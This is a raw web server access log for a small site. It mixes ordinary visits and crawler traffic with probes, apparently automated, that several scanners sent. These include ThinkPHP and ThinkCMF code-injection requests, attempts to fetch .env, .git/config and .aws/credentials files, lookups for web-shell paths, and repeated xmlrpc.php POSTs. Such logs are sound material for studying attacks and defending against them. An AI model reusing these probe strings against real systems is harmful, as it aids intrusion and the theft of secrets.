2406:da18:d8b:be00:cf82:63df:466f:875b - - [05/Jul/2022:15:09:14 +0000] "GET / HTTP/1.1" 200 10145 "-" "Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/40.0.2214.93 Safari/537.36"
2406:da18:d8b:be00:cf82:63df:466f:875b - - [05/Jul/2022:15:09:14 +0000] "GET / HTTP/1.1" 200 10145 "-" "Mozilla/5.0 (X11; NetBSD) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/27.0.1453.116 Safari/537.36"
13.215.122.116 - - [05/Jul/2022:15:10:02 +0000] "GET / HTTP/1.1" 200 24185 "-" "axios/0.26.1"
2406:da18:d8b:be00:cf82:63df:466f:875b - - [05/Jul/2022:15:10:03 +0000] "GET / HTTP/1.1" 200 10145 "-" "Mozilla/5.0 (Windows NT 6.2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/28.0.1467.0 Safari/537.36"
2406:da18:d8b:be00:cf82:63df:466f:875b - - [05/Jul/2022:15:10:03 +0000] "GET / HTTP/1.1" 200 10145 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/31.0.1623.0 Safari/537.36"
46.135.69.145 - - [05/Jul/2022:15:28:07 +0000] "GET / HTTP/1.1" 200 9986 "https://fsharely.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.2 Safari/605.1.15"
46.135.69.145 - - [05/Jul/2022:15:28:07 +0000] "GET /static/Index.css HTTP/1.1" 200 2765 "https://fsharely.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.2 Safari/605.1.15"
46.135.69.145 - - [05/Jul/2022:15:28:07 +0000] "GET /static/Fonts.css HTTP/1.1" 200 5275 "https://fsharely.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.2 Safari/605.1.15"
46.135.69.145 - - [05/Jul/2022:15:28:08 +0000] "GET /pinUI HTTP/1.1" 200 3620 "https://fsharely.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.2 Safari/605.1.15"
46.135.69.145 - - [05/Jul/2022:15:28:08 +0000] "GET /static/Pin.css HTTP/1.1" 200 1292 "https://fsharely.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.2 Safari/605.1.15"
185.7.214.104 - - [05/Jul/2022:15:28:39 +0000] "GET /solr/admin/info/system?wt=json HTTP/1.1" 301 594 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
185.7.214.104 - - [05/Jul/2022:15:28:51 +0000] "GET /solr/admin/info/system?wt=json HTTP/1.1" 404 5128 "http://172.104.146.10:80/solr/admin/info/system?wt=json" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
46.135.69.145 - - [05/Jul/2022:15:30:05 +0000] "GET / HTTP/1.1" 200 9986 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.2 Safari/605.1.15"
46.135.69.145 - - [05/Jul/2022:15:30:05 +0000] "GET /pinUI HTTP/1.1" 200 3620 "https://fsharely.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.2 Safari/605.1.15"
46.135.69.145 - - [05/Jul/2022:15:30:32 +0000] "-" 408 4743 "-" "-"
34.229.63.140 - - [05/Jul/2022:15:32:39 +0000] "GET /?ezoic_domain_verify=1 HTTP/1.1" 301 553 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.130 Safari/537.36 X-Middleton/1"
34.229.63.140 - - [05/Jul/2022:15:32:39 +0000] "GET /?ezoic_domain_verify=1 HTTP/1.1" 200 28464 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.130 Safari/537.36 X-Middleton/1"
198.235.24.143 - - [05/Jul/2022:15:33:33 +0000] "GET / HTTP/1.1" 200 28392 "-" "Expanse, a Palo Alto Networks company, searches across the global IPv4 space multiple times per day to identify customers&#39; presences on the Internet. If you would like to be excluded from our scans, please send IP addresses/domains to: scaninfo@paloaltonetworks.com"
3.144.155.59 - - [05/Jul/2022:15:37:43 +0000] "GET /.git/config HTTP/1.1" 301 593 "-" "python-requests/2.22.0"
184.94.240.88 - - [05/Jul/2022:15:50:00 +0000] "GET / HTTP/1.1" 301 540 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:53.0) Gecko/20100101 Firefox/53.0"
184.94.240.88 - - [05/Jul/2022:15:50:00 +0000] "GET / HTTP/1.1" 200 28415 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:53.0) Gecko/20100101 Firefox/53.0"
66.249.70.71 - - [05/Jul/2022:15:50:04 +0000] "GET /roundup-steigende-versuchung-zum-betrug-in-der-corona-krise/feed/ HTTP/1.1" 404 5165 "-" "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.53 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
184.94.240.88 - - [05/Jul/2022:15:50:14 +0000] "GET /cookies HTTP/1.1" 301 554 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:53.0) Gecko/20100101 Firefox/53.0"
184.94.240.88 - - [05/Jul/2022:15:50:15 +0000] "GET /cookies HTTP/1.1" 200 37494 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:53.0) Gecko/20100101 Firefox/53.0"
180.149.125.167 - - [05/Jul/2022:16:00:00 +0000] "GET / HTTP/1.1" 200 9873 "-" "Mozilla/5.0 (Windows NT 5.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.90 Safari/537.36"
185.7.214.104 - - [05/Jul/2022:16:12:46 +0000] "GET /index.php?s=/Index/\\think\\app/invokefunction&function=call_user_func_array&vars[0]=md5&vars[1][]=HelloThinkPHP21 HTTP/1.1" 301 770 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
185.7.214.104 - - [05/Jul/2022:16:12:54 +0000] "GET /index.php?s=/Index/\\think\\app/invokefunction&function=call_user_func_array&vars[0]=md5&vars[1][]=HelloThinkPHP21 HTTP/1.1" 404 5128 "http://172.104.146.10:80/index.php?s=/Index/\\think\\app/invokefunction&function=call_user_func_array&vars[0]=md5&vars[1][]=HelloThinkPHP21" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
18.209.211.206 - - [05/Jul/2022:16:17:14 +0000] "GET /?ezoic_domain_verify=1 HTTP/1.1" 301 553 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.130 Safari/537.36 X-Middleton/1"
18.209.211.206 - - [05/Jul/2022:16:17:15 +0000] "GET /?ezoic_domain_verify=1 HTTP/1.1" 200 28464 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.130 Safari/537.36 X-Middleton/1"
18.209.211.206 - - [05/Jul/2022:16:20:52 +0000] "GET / HTTP/1.1" 301 509 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/525.13 (KHTML, like Gecko) Chrome/0.A.B.C Safari/525.13"
18.209.211.206 - - [05/Jul/2022:16:20:53 +0000] "GET / HTTP/1.1" 200 28464 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/525.13 (KHTML, like Gecko) Chrome/0.A.B.C Safari/525.13"
18.209.211.206 - - [05/Jul/2022:16:20:53 +0000] "GET /CHANGELOG.txt?ez_orig=1 HTTP/1.1" 301 555 "-" "-"
18.209.211.206 - - [05/Jul/2022:16:20:53 +0000] "GET /CHANGELOG.txt?ez_orig=1 HTTP/1.1" 404 4993 "-" "-"
18.209.211.206 - - [05/Jul/2022:16:20:53 +0000] "GET /core/CHANGELOG.txt?ez_orig=1 HTTP/1.1" 301 565 "-" "-"
18.209.211.206 - - [05/Jul/2022:16:20:54 +0000] "GET /core/CHANGELOG.txt?ez_orig=1 HTTP/1.1" 404 4993 "-" "-"
18.209.211.206 - - [05/Jul/2022:16:20:54 +0000] "GET /modules/node/node.css?ez_orig=1 HTTP/1.1" 301 571 "-" "-"
18.209.211.206 - - [05/Jul/2022:16:20:54 +0000] "GET /modules/node/node.css?ez_orig=1 HTTP/1.1" 404 4993 "-" "-"
18.209.211.206 - - [05/Jul/2022:16:20:54 +0000] "GET /readme.html?ez_orig=1 HTTP/1.1" 301 551 "-" "-"
18.209.211.206 - - [05/Jul/2022:16:20:55 +0000] "GET /readme.html?ez_orig=1 HTTP/1.1" 404 4993 "-" "-"
18.209.211.206 - - [05/Jul/2022:16:20:55 +0000] "GET /wp-includes/css/buttons.css?ez_orig=1 HTTP/1.1" 301 583 "-" "-"
18.209.211.206 - - [05/Jul/2022:16:20:55 +0000] "GET /wp-includes/css/buttons.css?ez_orig=1 HTTP/1.1" 404 4993 "-" "-"
18.209.211.206 - - [05/Jul/2022:16:20:56 +0000] "GET /README.txt?ez_orig=1 HTTP/1.1" 301 549 "-" "-"
18.209.211.206 - - [05/Jul/2022:16:20:56 +0000] "GET /README.txt?ez_orig=1 HTTP/1.1" 404 4993 "-" "-"
18.209.211.206 - - [05/Jul/2022:16:20:56 +0000] "GET /media/system/js/core.js?ez_orig=1 HTTP/1.1" 301 575 "-" "-"
18.209.211.206 - - [05/Jul/2022:16:20:57 +0000] "GET /media/system/js/core.js?ez_orig=1 HTTP/1.1" 404 4993 "-" "-"
18.209.211.206 - - [05/Jul/2022:16:20:57 +0000] "GET /sitecore/admin/login.aspx HTTP/1.1" 301 559 "-" "-"
18.209.211.206 - - [05/Jul/2022:16:20:57 +0000] "GET /sitecore/admin/login.aspx HTTP/1.1" 404 4993 "-" "-"
66.249.70.78 - - [05/Jul/2022:16:22:40 +0000] "GET / HTTP/1.1" 200 10114 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.70.86 - - [05/Jul/2022:16:23:04 +0000] "GET / HTTP/1.1" 200 10114 "-" "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.84 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.70.78 - - [05/Jul/2022:16:23:09 +0000] "GET /sw.js HTTP/1.1" 200 7557 "https://fsharely.com/" "Mozilla/5.0 AppleWebKit/537.36 (KHTML, like Gecko; compatible; Googlebot/2.1; +http://www.google.com/bot.html) Chrome/102.0.5005.115 Safari/537.36"
66.249.70.86 - - [05/Jul/2022:16:24:06 +0000] "GET /static/Images/apple-touch-icon-120x120.png HTTP/1.1" 200 11509 "-" "Googlebot-Image/1.0"
66.249.70.78 - - [05/Jul/2022:16:24:07 +0000] "GET /static/Images/favicon.ico HTTP/1.1" 200 39635 "-" "Googlebot-Image/1.0"
66.249.70.82 - - [05/Jul/2022:16:24:08 +0000] "GET /favicon.ico HTTP/1.1" 404 5169 "-" "Googlebot-Image/1.0"
66.249.70.78 - - [05/Jul/2022:16:24:16 +0000] "GET /static/Images/apple-touch-icon-144x144.png HTTP/1.1" 200 11668 "-" "Googlebot-Image/1.0"
66.249.70.78 - - [05/Jul/2022:16:24:25 +0000] "GET /static/Images/apple-touch-icon-57x57.png HTTP/1.1" 200 7186 "-" "Googlebot-Image/1.0"
66.249.70.78 - - [05/Jul/2022:16:24:32 +0000] "GET /static/Images/apple-touch-icon.png HTTP/1.1" 200 7186 "-" "Googlebot-Image/1.0"
66.249.70.78 - - [05/Jul/2022:16:24:40 +0000] "GET /static/Images/apple-touch-icon-76x76.png HTTP/1.1" 200 8539 "-" "Googlebot-Image/1.0"
66.249.70.78 - - [05/Jul/2022:16:24:43 +0000] "GET /static/Images/apple-touch-icon-72x72.png HTTP/1.1" 200 3166 "-" "Googlebot-Image/1.0"
66.249.70.82 - - [05/Jul/2022:16:25:10 +0000] "GET /static/Images/apple-touch-icon-114x114.png HTTP/1.1" 200 12991 "-" "Googlebot-Image/1.0"
66.249.70.82 - - [05/Jul/2022:16:25:51 +0000] "GET /static/Images/apple-touch-icon-152x152.png HTTP/1.1" 200 14861 "-" "Googlebot-Image/1.0"
66.249.70.67 - - [05/Jul/2022:16:35:04 +0000] "GET /roundup-unionsfraktion-pocht-auf-anderungen-am-insektenschutzpaket/ HTTP/1.1" 404 5165 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
185.7.214.104 - - [05/Jul/2022:16:37:32 +0000] "GET /?a=fetch&content=<php>die(@md5(HelloThinkCMF))</php> HTTP/1.1" 301 654 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
185.7.214.104 - - [05/Jul/2022:16:37:40 +0000] "GET /?a=fetch&content=<php>die(@md5(HelloThinkCMF))</php> HTTP/1.1" 200 10073 "http://172.104.146.10:80/?a=fetch&content=<php>die(@md5(HelloThinkCMF))</php>" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
114.119.148.106 - - [05/Jul/2022:16:58:11 +0000] "GET /robots.txt HTTP/1.1" 404 5144 "-" "Mozilla/5.0 (compatible;PetalBot;+https://webmaster.petalsearch.com/site/petalbot)"
34.229.63.140 - - [05/Jul/2022:17:08:16 +0000] "GET /?ezoic_domain_verify=1 HTTP/1.1" 301 553 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.130 Safari/537.36 X-Middleton/1"
34.229.63.140 - - [05/Jul/2022:17:08:17 +0000] "GET /?ezoic_domain_verify=1 HTTP/1.1" 200 28464 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.130 Safari/537.36 X-Middleton/1"
185.254.196.223 - - [05/Jul/2022:17:10:41 +0000] "GET /.env HTTP/1.1" 301 579 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
185.254.196.223 - - [05/Jul/2022:17:10:43 +0000] "POST / HTTP/1.1" 301 571 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
66.249.70.67 - - [05/Jul/2022:17:20:04 +0000] "GET /robots.txt HTTP/1.1" 404 5165 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
18.222.50.71 - - [05/Jul/2022:17:20:49 +0000] "GET /.git/config HTTP/1.1" 301 593 "-" "python-requests/2.22.0"
185.7.214.104 - - [05/Jul/2022:17:21:45 +0000] "GET /?XDEBUG_SESSION_START=phpstorm HTTP/1.1" 301 594 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
185.7.214.104 - - [05/Jul/2022:17:21:49 +0000] "GET /?XDEBUG_SESSION_START=phpstorm HTTP/1.1" 200 10073 "http://172.104.146.10:80/?XDEBUG_SESSION_START=phpstorm" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
20.232.21.231 - - [05/Jul/2022:17:30:56 +0000] "GET /.env HTTP/1.1" 301 579 "-" "Mozilla/5.0 (Linux; U; Android 4.4.2; en-US; HM NOTE 1W Build/KOT49H) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 UCBrowser/11.0.5.850 U3/0.8.0 Mobile Safari/534.30"
20.232.21.231 - - [05/Jul/2022:17:30:56 +0000] "POST / HTTP/1.1" 301 571 "-" "Mozilla/5.0 (Linux; U; Android 4.4.2; en-US; HM NOTE 1W Build/KOT49H) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 UCBrowser/11.0.5.850 U3/0.8.0 Mobile Safari/534.30"
20.232.21.231 - - [05/Jul/2022:17:30:57 +0000] "GET /.env HTTP/1.1" 404 5196 "-" "Mozilla/5.0 (Linux; U; Android 4.4.2; en-US; HM NOTE 1W Build/KOT49H) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 UCBrowser/11.0.5.850 U3/0.8.0 Mobile Safari/534.30"
20.232.21.231 - - [05/Jul/2022:17:30:58 +0000] "POST / HTTP/1.1" 405 5178 "-" "Mozilla/5.0 (Linux; U; Android 4.4.2; en-US; HM NOTE 1W Build/KOT49H) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 UCBrowser/11.0.5.850 U3/0.8.0 Mobile Safari/534.30"
66.249.64.173 - - [05/Jul/2022:17:32:13 +0000] "GET / HTTP/1.1" 200 10114 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.64.173 - - [05/Jul/2022:17:32:24 +0000] "GET / HTTP/1.1" 200 10114 "-" "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.84 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.64.173 - - [05/Jul/2022:17:32:34 +0000] "GET /sw.js HTTP/1.1" 200 7557 "https://www.fsharely.com/" "Mozilla/5.0 AppleWebKit/537.36 (KHTML, like Gecko; compatible; Googlebot/2.1; +http://www.google.com/bot.html) Chrome/102.0.5005.115 Safari/537.36"
66.249.64.173 - - [05/Jul/2022:17:32:34 +0000] "GET /sw.js HTTP/1.1" 200 2828 "https://www.fsharely.com/" "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.5005.115 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.64.167 - - [05/Jul/2022:17:33:21 +0000] "GET /static/Images/apple-touch-icon-152x152.png HTTP/1.1" 200 14861 "-" "Googlebot-Image/1.0"
66.249.64.167 - - [05/Jul/2022:17:33:24 +0000] "GET /static/Images/apple-touch-icon-144x144.png HTTP/1.1" 200 6939 "-" "Googlebot-Image/1.0"
66.249.64.169 - - [05/Jul/2022:17:33:26 +0000] "GET /static/Images/apple-touch-icon-120x120.png HTTP/1.1" 200 11509 "-" "Googlebot-Image/1.0"
66.249.64.167 - - [05/Jul/2022:17:33:31 +0000] "GET /static/Images/apple-touch-icon-57x57.png HTTP/1.1" 200 7186 "-" "Googlebot-Image/1.0"
66.249.64.167 - - [05/Jul/2022:17:33:36 +0000] "GET /static/Images/apple-touch-icon.png HTTP/1.1" 200 7186 "-" "Googlebot-Image/1.0"
66.249.64.167 - - [05/Jul/2022:17:33:37 +0000] "GET /static/Images/apple-touch-icon-72x72.png HTTP/1.1" 200 3166 "-" "Googlebot-Image/1.0"
66.249.64.167 - - [05/Jul/2022:17:33:38 +0000] "GET /static/Images/favicon.ico HTTP/1.1" 200 34906 "-" "Googlebot-Image/1.0"
66.249.64.167 - - [05/Jul/2022:17:33:44 +0000] "GET /static/Images/apple-touch-icon-76x76.png HTTP/1.1" 200 8539 "-" "Googlebot-Image/1.0"
154.198.193.131 - - [05/Jul/2022:17:33:50 +0000] "GET / HTTP/1.1" 200 28566 "-" "-"
66.249.64.167 - - [05/Jul/2022:17:33:51 +0000] "GET /favicon.ico HTTP/1.1" 404 5169 "-" "Googlebot-Image/1.0"
66.249.64.167 - - [05/Jul/2022:17:33:52 +0000] "GET /static/Images/apple-touch-icon-114x114.png HTTP/1.1" 200 8262 "-" "Googlebot-Image/1.0"
154.198.193.131 - - [05/Jul/2022:17:33:56 +0000] "GET /static/Images/favicon.ico HTTP/1.1" 200 39575 "-" "Go-http-client/1.1"
154.198.193.131 - - [05/Jul/2022:17:33:57 +0000] "GET /robots.txt HTTP/1.1" 404 5109 "-" "Go-http-client/1.1"
154.198.193.131 - - [05/Jul/2022:17:33:57 +0000] "GET /sitemap.xml HTTP/1.1" 404 5109 "-" "Go-http-client/1.1"
42.83.147.34 - - [05/Jul/2022:17:38:07 +0000] "GET / HTTP/1.1" 301 509 "-" "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko)Chrome/74.0.3729.169 Safari/537.36"
42.83.147.34 - - [05/Jul/2022:17:38:10 +0000] "GET / HTTP/1.1" 200 9877 "-" "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko)Chrome/74.0.3729.169 Safari/537.36"
66.249.70.95 - - [05/Jul/2022:17:40:04 +0000] "GET /roundup-warnschuss-und-familiare-verwerfungen-weiter-zoff-um-super-league/ HTTP/1.1" 404 5165 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
40.84.22.24 - - [05/Jul/2022:17:41:24 +0000] "GET / HTTP/1.1" 200 10054 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.125 Safari/537.36"
40.84.22.24 - - [05/Jul/2022:17:41:24 +0000] "HEAD /wp-content/uploads/wp-stream.php HTTP/1.1" 404 4921 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.125 Safari/537.36"
40.84.22.24 - - [05/Jul/2022:17:41:25 +0000] "HEAD /wp-content/uploads/wp-blockup.php HTTP/1.1" 404 4921 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.125 Safari/537.36"
40.84.22.24 - - [05/Jul/2022:17:41:25 +0000] "GET /Panels.txt HTTP/1.1" 404 5109 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.125 Safari/537.36"
40.84.22.24 - - [05/Jul/2022:17:41:26 +0000] "GET /wp-content/uploads/upload_index.php?auth=436548 HTTP/1.1" 404 5109 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.125 Safari/537.36"
40.84.22.24 - - [05/Jul/2022:17:41:26 +0000] "GET /wp-includes/upload_index.php?auth=436548 HTTP/1.1" 404 5109 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.125 Safari/537.36"
40.84.22.24 - - [05/Jul/2022:17:41:26 +0000] "GET /upload_index.php?auth=436548 HTTP/1.1" 404 5109 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.125 Safari/537.36"
40.84.22.24 - - [05/Jul/2022:17:41:27 +0000] "GET /wp-content/uploads/th3_alpha.php?upload=hidden HTTP/1.1" 404 5109 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.125 Safari/537.36"
40.84.22.24 - - [05/Jul/2022:17:41:27 +0000] "GET /th3_alpha.php?upload=hidden HTTP/1.1" 404 5109 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.125 Safari/537.36"
40.84.22.24 - - [05/Jul/2022:17:41:27 +0000] "GET /wp-includes/th3_alpha.php?upload=hidden HTTP/1.1" 404 5109 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.125 Safari/537.36"
40.84.22.24 - - [05/Jul/2022:17:41:28 +0000] "GET /v.php HTTP/1.1" 404 5109 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.125 Safari/537.36"
40.84.22.24 - - [05/Jul/2022:17:41:28 +0000] "GET /class-wp-registroy.php HTTP/1.1" 404 5109 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.125 Safari/537.36"
40.84.22.24 - - [05/Jul/2022:17:41:28 +0000] "GET /wp-content/uploads/class-wp-type-registroy.php HTTP/1.1" 404 5109 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.125 Safari/537.36"
40.84.22.24 - - [05/Jul/2022:17:41:28 +0000] "GET /wp-content/class-wp-type-registroy.php HTTP/1.1" 404 5109 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.125 Safari/537.36"
40.84.22.24 - - [05/Jul/2022:17:41:29 +0000] "POST /xmlrpc.php HTTP/1.1" 405 5110 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.125 Safari/537.36"
40.84.22.24 - - [05/Jul/2022:17:41:29 +0000] "POST /xmlrpc.php HTTP/1.1" 405 5110 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.125 Safari/537.36"
40.84.22.24 - - [05/Jul/2022:17:41:30 +0000] "POST /xmlrpc.php HTTP/1.1" 405 5110 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.125 Safari/537.36"
40.84.22.24 - - [05/Jul/2022:17:41:30 +0000] "POST /xmlrpc.php HTTP/1.1" 405 5110 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.125 Safari/537.36"
40.84.22.24 - - [05/Jul/2022:17:41:30 +0000] "POST /xmlrpc.php HTTP/1.1" 405 5110 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.125 Safari/537.36"
40.84.22.24 - - [05/Jul/2022:17:41:31 +0000] "POST /xmlrpc.php HTTP/1.1" 405 5110 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.125 Safari/537.36"
157.245.176.143 - - [05/Jul/2022:17:42:34 +0000] "SSTP_DUPLEX_POST /sra_{BA195980-CD49-458b-9E23-C84EE0ADCD75}/ HTTP/1.1" 400 5233 "-" "-"
185.21.216.169 - - [05/Jul/2022:17:50:37 +0000] "GET / HTTP/1.1" 301 515 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.0.0 Safari/537.36"
185.7.214.104 - - [05/Jul/2022:17:52:35 +0000] "GET /console/ HTTP/1.1" 301 550 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
185.7.214.104 - - [05/Jul/2022:17:52:42 +0000] "GET /console/ HTTP/1.1" 404 5128 "http://172.104.146.10:80/console/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
35.173.218.62 - - [05/Jul/2022:17:55:01 +0000] "GET /?ezoic_domain_verify=1 HTTP/1.1" 301 553 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.130 Safari/537.36 X-Middleton/1"
35.173.218.62 - - [05/Jul/2022:17:55:01 +0000] "GET /?ezoic_domain_verify=1 HTTP/1.1" 200 28464 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.130 Safari/537.36 X-Middleton/1"
221.2.163.231 - - [05/Jul/2022:17:58:00 +0000] "GET / HTTP/1.1" 301 515 "-" "Mozilla/5.0"
109.237.103.118 - - [05/Jul/2022:18:07:37 +0000] "GET / HTTP/1.0" 400 622 "-" "-"
109.237.103.118 - - [05/Jul/2022:18:07:37 +0000] "GET /.aws/credentials HTTP/1.1" 404 5181 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
